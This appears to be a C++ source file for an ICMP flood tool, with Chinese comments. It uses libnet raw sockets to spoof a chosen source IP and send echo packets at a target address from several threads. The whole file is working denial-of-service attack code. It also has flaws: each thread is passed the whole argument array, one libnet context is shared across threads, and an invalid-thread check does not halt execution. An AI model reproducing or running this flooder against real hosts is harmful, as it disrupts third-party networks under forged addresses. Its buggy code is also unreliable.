#include "icmpflood.h"

#include <iostream>
#include <cstdlib>
#include <cstring>
#include <pthread.h>
#include <libnet.h>
#include <QDebug>

using namespace std;

uint32_t ip_str_to_bin(const char *ip_str) {
    struct in_addr addr;
    inet_aton(ip_str, &addr);
    return ntohl(addr.s_addr);
}

// 线程函数
void* send_icmp(void* arg) {
    struct thread_arg* t_arg = (struct thread_arg*) arg;
    // 构造 ICMP 报文
    libnet_ptag_t icmp_tag = libnet_build_icmpv4_echo(
        ICMP_ECHO,  // ICMP 报文类型
        0,  // ICMP 报文代码
        0,  // ICMP 报文校验和（0 表示自动计算）
        t_arg->id,  // ICMP 报文标识符
        0,  // ICMP 报文序列号（由 send_icmp() 函数计算）
        NULL,  // ICMP 报文负载数据
        0,  // ICMP 报文负载数据长度
        t_arg->l,  // libnet 上下文
        0  // libnet 构造选项
    );


    if (icmp_tag == -1) {
        cerr << "libnet_build_icmpv4_echo() failed: " << libnet_geterror(t_arg->l) << endl;
        return NULL;
    }

    // 构造 IP 头部
    libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H,               // IP 头部长度
        0,              // 服务类型
        libnet_get_prand(LIBNET_PRu16),                         // ID
        0,                           // 标志和片偏移
        64,                          // TTL
        IPPROTO_ICMP,                // 上层协议
        0,                           // 校验和，0 表示自动计算
        t_arg->src_ip,                      // 源 IP 地址
        t_arg->dst_ip,                      // 目标 IP 地址
        NULL,                        // 不添加负载
        0,                           // 负载长度
        t_arg->l,
        0
    );

    // 发送 ICMP 报文
    for (uint16_t seq = t_arg->seq_start; seq <= t_arg->seq_end; seq++) {
        int len = libnet_write(t_arg->l);  // 发送报文
        if (len == -1) {
            cerr << "libnet_write() failed: " << libnet_geterror(t_arg->l) << endl;
            return NULL;
        }
        cout << "Sent ICMP packet with seq=" << seq << endl;
        // 延时一段时间，防止发送过快导致网络拥塞
        usleep(5000);  // 延时 1 毫秒
    }

    return NULL;
}

icmpflood::icmpflood(char* src_ip,char* dst_ip,char* icmpid,char* start_seq,char* end_seq,char* threads_num){

    uint32_t srcip = inet_addr(src_ip);
    uint32_t dstip = inet_addr(dst_ip);
    uint16_t icmpid1 = atoi(icmpid);
    uint32_t startseq = atoi(start_seq);
    uint32_t endseq = atoi(end_seq);
    int num_threads = 1;

    num_threads=atoi(threads_num);

    qDebug()<<"use threads num"<<num_threads<<endl;
    if (num_threads < 1 || num_threads > MAX_THREADS) {
            std::cerr << "Invalid number of threads" << std::endl;

        }

    pthread_t threads[num_threads];
    thread_arg  args[num_threads];

    // 创建 libnet 上下文
    libnet_t *ln = libnet_init(LIBNET_RAW4, NULL, NULL);
    if (ln == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", libnet_geterror(ln));
        exit(1);
    }


    for (int i = 0; i < num_threads; i++) {
           args[i].l=ln;
           args[i].src_ip = srcip;
           args[i].dst_ip = dstip;
           args[i].id = icmpid1;
           args[i].seq_start = startseq + i * ((endseq - startseq + 1) / num_threads);
           args[i].seq_end= startseq + (i + 1) * ((endseq - startseq + 1) / num_threads) - 1;
           pthread_create(&threads[i], NULL, send_icmp, args);
    }

    // 等待所有线程结束
    for (int i = 0; i < num_threads; i++) {
            pthread_join(threads[i], NULL);
    }

    // 释放 libnet 上下文并退出程序
    libnet_destroy(ln);

}
